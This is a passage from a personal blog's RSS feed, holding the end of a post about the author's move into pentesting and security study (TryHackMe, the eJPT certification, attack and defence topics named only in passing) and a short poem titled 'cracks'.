+<p>it just so happened that my interest in infosec/cybersec never truly died, that i happened to follow many infosec professionals and pentesters on twitter. i hardly ever knew what they were talking about, but i liked it. in the past year, it hit me. if i like it so much, what&rsquo;s stopping me from actually doing it? not much, in fact. and so i started looking more closely. and learning.</p>
+<p>i quickly identified pentesting as my dream field. i started to consume vast amounts of information on the field: what they do, their certifications, their techniques. i joined online communities like tryhackme, and even signed up for a junior pentesting cert from elearnsecurity. now, i have both the eJPT cert as well as a bunch of completed rooms on tryhackme to my name. it may not be much, but i was hooked.</p>
+<p>in the past year, i&rsquo;ve learned more and more about linux, windows, networking, databases (beyond the scope of my job), shell scripting, web hacking, enumeration, footprinting, scanning, vulnerabilities. i&rsquo;ve learned and practiced a variety of attacks: bruteforce/dictionary attacks using hydra, xss, sql injections, arp poisoning, file inclusions, remote code executions (reverse shells), privilege escalation, and finally, active directory. what&rsquo;s missing here? the other side! and so i started to learn about defense: firewalls, SIEMs, IPS/IDS, hardening&hellip;and there&rsquo;s still so much to learn.</p>
+<h3 id="then">then</h3>
+<p>i learned that when you truly enjoy something, you don&rsquo;t get tired of it. rather, you can&rsquo;t get tired of it. i want to keep going, and keep learning, and keep getting better. i hope to get a job in the field where i can learn from true professionals and real systems. i&rsquo;m also going to use this site to dump whatever i&rsquo;ve learned, whatever room i&rsquo;ve solved, and pretty much anything else i feel like.</p>
+<p>to whoever&rsquo;s reading this: thank you. and i hope that whatever you find yourself naturally gravitating towards, you accept it and lean into it and turn it into a passion.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>cracks</title>
+            <link>/posts/2021/02/cracks/</link>
+            <pubDate>Mon, 15 Feb 2021 01:43:33 -0500</pubDate>
+            
+            <guid>/posts/2021/02/cracks/</guid>
+            <description>cracks in the asphalt, cracks in the curb
+cracks in the sidewalk, cracks in the doors
+cracks in the walls and cracks in the floor
+cracks in the glass, cracks in the steel
+cracks in the marble and cracks in the pillars
+crack my eyes open to see a little more
+cracks in my hands, cracks in my feet
+cracks in my smile, cracks in my face
+cracks in my youth and cracks in my world</description>
+            <content type="html"><![CDATA[<p>cracks in the asphalt, cracks in the curb</p>
+<p>cracks in the sidewalk, cracks in the doors</p>
+<p>cracks in the walls and cracks in the floor</p>
+<p>cracks in the glass, cracks in the steel</p>
+<p>cracks in the marble and cracks in the pillars</p>
+<p>crack my eyes open to see a little more</p>
+<p>cracks in my hands, cracks in my feet</p>
+<p>cracks in my smile, cracks in my face</p>
+<p>cracks in my youth and cracks in my world</p>
+<p>cracks in the earth, cracks in the ways</p>
+<p>cracks in the stairs, between me and You</p>
+<p>i move inwards, towards the cracks in my psyche</p>
+<p>hoping to trip and hold on to You</p>
+<p>but i don&rsquo;t</p>
+<p>i slip through the cracks</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
